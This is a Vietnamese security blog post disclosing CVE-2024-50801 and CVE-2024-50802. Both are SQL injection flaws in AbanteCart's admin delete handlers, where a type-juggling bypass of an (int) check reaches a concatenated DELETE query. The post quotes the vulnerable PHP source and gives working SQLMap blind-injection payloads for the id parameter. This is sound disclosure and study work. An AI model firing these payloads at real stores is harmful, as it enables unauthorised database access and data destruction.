[![](https://substackcdn.com/image/fetch/w_96,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)](/)
# [Trung’s Substack](/)

SubscribeSign in
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6fcf7b5-df00-4d09-8a10-5c6d91a8b8da_1620x961.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackCVE-2024-50801 && CVE-2024-50802 SQL Injection in the AbanteCart](https://substack.com/home/post/p-150200639?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMore
# CVE-2024-50801 && CVE-2024-50802 SQL Injection in the AbanteCart

### CVE-2024-50801, CVE-2024-50802

[![](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)](https://substack.com/%40chiggerabcd)[Trung](https://substack.com/%40chiggerabcd)Oct 30, 2024
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6fcf7b5-df00-4d09-8a10-5c6d91a8b8da_1620x961.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackCVE-2024-50801 && CVE-2024-50802 SQL Injection in the AbanteCart](https://substack.com/home/post/p-150200639?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMoreShare
# Giới thiệu

Mình xin tự giới thiệu mình là **Trung** aka **chigger** . Mình là thành viên trong gia đình [CookieHanHoan](https://www.facebook.com/cookie.han.hoan).

Mình sẽ tiếp tục với hành trình spam nhiều CVE nhất có thể.

# Thông tin lỗ hổng

Bài viết này sẽ sử dụng phương pháp phân tích **Whitebox**, còn được gọi là **Source Code Audit** để phân tích source code và tìm ra lỗ hổng.

CVE-2024-50801:

* Điểm số: 6.0
* Mức độ nguy hiểm: MEDIUM
* Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:L

CVE-2024-50802:

* Điểm số: 6.0
* Mức độ nguy hiểm: MEDIUM
* Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:L

# Mục tiêu

AbanteCart là một nền tảng thương mại điện tử mã nguồn mở miễn phí để hỗ trợ bán lẻ trực tuyến. AbanteCart là một ứng dụng web sẵn sàng hoạt động cũng như là nền tảng đáng tin cậy để xây dựng các giải pháp thương mại điện tử tùy chỉnh.

Công nghệ sử dụng:

* **PHP**: Ngôn ngữ lập trình phía máy chủ dùng để phát triển ứng dụng web động.
* **MySQL**: Hệ quản trị cơ sở dữ liệu mã nguồn mở lưu trữ và quản lý dữ liệu.
* **JavaScript và jQuery**: JavaScript tạo tương tác động; jQuery đơn giản hóa thao tác với DOM.
* **HTML/CSS**: HTML cấu trúc nội dung, CSS tạo kiểu cho trang web.
* **Kiến trúc MVC**: Mẫu thiết kế tách biệt logic ứng dụng, giao diện và xử lý yêu cầu.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6fcf7b5-df00-4d09-8a10-5c6d91a8b8da_1620x961.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/c6fcf7b5-df00-4d09-8a10-5c6d91a8b8da_1620x961.png)

Theo trang chủ của AbanteCart có khoảng **42.000 live sites**.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c90b09c-8b9b-479c-a8fa-7a2a216d5f7f_1447x965.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/0c90b09c-8b9b-479c-a8fa-7a2a216d5f7f_1447x965.png)
# Nguyên nhân gốc rễ (root-cause) gây ra lỗ hổng?

Lỗ hổng Injection, đặc biệt là SQL Injection, thường xuất phát từ việc ứng dụng không kiểm soát chặt chẽ dữ liệu đầu vào của người dùng, hay còn gọi là dữ liệu không đáng tin cậy (Untrusted Data). Điều này tạo ra một môi trường thuận lợi cho các cuộc tấn công, khi mà kẻ tấn công có thể tận dụng những lỗ hổng này để truy cập hoặc thao túng dữ liệu một cách trái phép.

Trong nền tảng AbanteCart, nhiều câu truy vấn SQL được viết thủ công dưới dạng raw query, làm tăng khả năng xuất hiện các lỗ hổng bảo mật. Sự thiếu sót trong việc thực hiện kiểm tra và xác thực dữ liệu đầu vào không chỉ tiềm ẩn nguy cơ mà còn đe dọa đến tính toàn vẹn và bảo mật của hệ thống.

# Type Juggling

```
<?php
     if (!(int) $id) {
            return false;
        }
     return true;
?>
```

Mình vừa phát hiện một vấn đề thú vị trong đoạn code này. Điều đáng chú ý là khi thực hiện việc chuyển đổi từ chuỗi sang số nguyên, giá trị của `$id` sẽ được xử lý như sau: nếu `$id = "abc"`, thì `(int)$id` sẽ bằng 0. Tuy nhiên, nếu `$id = "123abc"`, thì `(int)$id` sẽ trả về 123.

Do đó, với đoạn code trên, nếu giá trị của `$id` là `"123abc"`, nó có thể vượt qua kiểm tra và trả về giá trị true, có thể tạo ra lỗ hổng bảo mật.

# CVE-2024-50801

Tại file `public_html/admin/model/catalog/collection.php`, mình nhận thấy có sự xuất hiện của hàm `delete()`, trong đó thực hiện truy vấn bằng cách sử dụng cú pháp nối chuỗi trong code PHP. Mặc dù developer đã ép kiểu biến `$id` thành kiểu số nguyên, nhưng như mình đã đề cập về vấn đề type juggling ở trên, điều này vẫn có thể tạo ra lỗ hổng SQL Injection.

```
class ModelCatalogCollection extends Model
{
...
   public function delete($id)
    {
        if (!(int) $id) {
            return false;
        }
        $db = Registry::getInstance()->get('db');
        $colTableName = $db->table('collections');
        $query = 'DELETE FROM '.$colTableName.' WHERE id='.$id;
        $db->query($query);
        return true;
    }
...

```

Tại file `public_html/admin/controller/responses/listing_grid/collections.php`, mình nhận thấy sự xuất hiện của hàm `update()`, trong đó gọi hàm `delete()` được đề cập ở trên. Tuy nhiên, tham số `$id` được truyền vào hàm này lại chưa trải qua bước xác thực từ người dùng. Do đó, hàm `update()` tiềm ẩn lỗ hổng SQL Injection, cho phép kẻ tấn công có khả năng khai thác dữ liệu trái phép.

```
class ControllerResponsesListingGridCollections extends AController
{
...
   public function update()
    {
        //init controller data
        $this->extensions->hk_InitData($this, __FUNCTION__);

        $this->loadModel('catalog/collection');

        if ($this->request->is_POST()) {
            $post = $this->request->post;
            if ($post['oper'] === 'save') {
                if (!is_array($post['status'])) {
                    return;
                }
                foreach ((array) $post['status'] as $key => $value) {
                    $this->model_catalog_collection->update(
                        $key,
                        [
                            'status' => (int) $value,
                        ]
                    );
                }
            }

            if ($post['oper'] === 'del' && isset($post['id'])) {
                $ids = array_unique(explode(',', $post['id']));
                foreach ($ids as $id) {
                    $this->model_catalog_collection->delete($id);
                }
            }
        }

        //update controller data
        $this->extensions->hk_UpdateData($this, __FUNCTION__);
    }
...
}
```
## Cách khai thác

Việc thiếu kiểm tra dữ liệu đầu vào khi sử dụng raw query tiềm ẩn nguy cơ **SQL Injection**. Kẻ tấn công có thể lợi dụng ký tự đặc biệt để phá vỡ cú pháp truy vấn và thực thi mã độc hại.

Mình thử với kí tự đặc biệt 1**'(**lợi dụng type juggling**)**. Quan sát thấy server trả về thông báo **Status code 400 Application Error**. Vậy ở đây ở tham số `id` tồn tại lỗ hổng SQL Injection.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F47634bd9-48a7-4433-9f94-adfcf721a4ec_1708x482.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/47634bd9-48a7-4433-9f94-adfcf721a4ec_1708x482.png)

Mình sử dụng công cụ như **SQLMap** (công cụ tự động hóa quá trình khai thác lỗ hổng SQL Injection). SQLMap có thể tạo ra mã khai thác tùy chỉnh dựa trên phân tích tự động của ứng dụng mục tiêu và cơ sở dữ liệu liên quan.

Mã khai thác:

```
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: oper=del&id=2 RLIKE (SELECT (CASE WHEN (2470=2470) THEN 2 ELSE 0x28 END))

```
# CVE-2024-50802

Tương tự như lỗ hổng CVE đã đề cập ở trên, file `public_html/admin/model/design/email_template.php` cũng gặp phải vấn đề **type juggling.** Trong file này, mình nhận thấy sự xuất hiện của hàm `delete()`, trong đó thực hiện truy vấn bằng cú pháp nối chuỗi trong code PHP. Điều này có thể dẫn đến lỗ hổng SQL Injection, tạo cơ hội cho kẻ tấn công khai thác hệ thống.

```
class ModelDesignEmailTemplate extends Model
{
...
   public function delete($id)
    {
        if (!(int) $id) {
            return false;
        }
        $etTableName = $this->db->table('email_templates');
        $query = 'DELETE FROM '.$etTableName.' WHERE id='.$id;
        $this->db->query($query);
        return true;
    }
...
}
```

Tại file `public_html/admin/controller/responses/listing_grid/email_templates.php`, mình nhận thấy sự xuất hiện của hàm `update()`, trong đó gọi hàm `delete()` được đề cập ở trên. Tuy nhiên, tham số `$id` được truyền vào hàm này lại chưa trải qua bước xác thực từ người dùng. Do đó, hàm `update()` tiềm ẩn lỗ hổng SQL Injection, cho phép kẻ tấn công có khả năng khai thác dữ liệu trái phép.

```
class ControllerResponsesListingGridEmailTemplates extends AController
{
...
   public function update()
    {
        //init controller data
        $this->extensions->hk_InitData($this, __FUNCTION__);

        /** @var ModelDesignEmailTemplate $mdl */
        $mdl = $this->loadModel('design/email_template');

        if ($this->request->is_POST()) {
            $post = $this->request->post;
            if ($post['oper'] === 'save') {
                if (!is_array($post['status'])) {
                    return;
                }
                foreach ((array) $post['status'] as $key => $value) {
                    $mdl->update($key, ['status' => (int) $value]);
                }
            }

            if ($post['oper'] === 'del' && isset($post['id'])) {
                $ids = array_unique(explode(',', $post['id']));
                foreach ($ids as $id) {
                    $mdl->delete($id);
                }
            }
        }
...
}

```
## Cách khai thác

Việc thiếu kiểm tra dữ liệu đầu vào khi sử dụng raw query tiềm ẩn nguy cơ **SQL Injection**. Kẻ tấn công có thể lợi dụng ký tự đặc biệt để phá vỡ cú pháp truy vấn và thực thi mã độc hại.

Mình thử với kí tự đặc biệt 1**' (**lợi dụng type juggling**)**. Quan sát thấy server trả về thông báo **Status code 400 Application Error**. Vậy ở đây ở tham số `id` tồn tại lỗ hổng SQL Injection.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7a584591-d447-4690-9a57-1f46df0b1696_1347x526.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/7a584591-d447-4690-9a57-1f46df0b1696_1347x526.png)

Mình sử dụng công cụ như **SQLMap** (công cụ tự động hóa quá trình khai thác lỗ hổng SQL Injection). SQLMap có thể tạo ra mã khai thác tùy chỉnh dựa trên phân tích tự động của ứng dụng mục tiêu và cơ sở dữ liệu liên quan.

Mã khai thác:

```
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: oper=del&id=2 RLIKE (SELECT (CASE WHEN (2470=2470) THEN 2 ELSE 0x28 END))

```
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6fcf7b5-df00-4d09-8a10-5c6d91a8b8da_1620x961.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackCVE-2024-50801 && CVE-2024-50802 SQL Injection in the AbanteCart](https://substack.com/home/post/p-150200639?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMoreShare
#### Discussion about this post

CommentsRestacks![](https://substackcdn.com/image/fetch/w_32,h_32,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png)TopLatestDiscussions

No posts

Ready for more?

Subscribe© 2025 Trung[Privacy](https://substack.com/privacy) ∙ [Terms](https://substack.com/tos) ∙ [Collection notice](https://substack.com/ccpa#personal-data-collected) [Start Writing](https://substack.com/signup?utm_source=substack&utm_medium=web&utm_content=footer)[Get the app](https://substack.com/app/app-store-redirect?utm_campaign=app-marketing&utm_content=web-footer-button)[Substack](https://substack.com) is the home for great culture
#### Share

Copy linkFacebookEmailNotesMore

This site requires JavaScript to run correctly. Please [turn on JavaScript](https://enable-javascript.com/) or unblock scripts


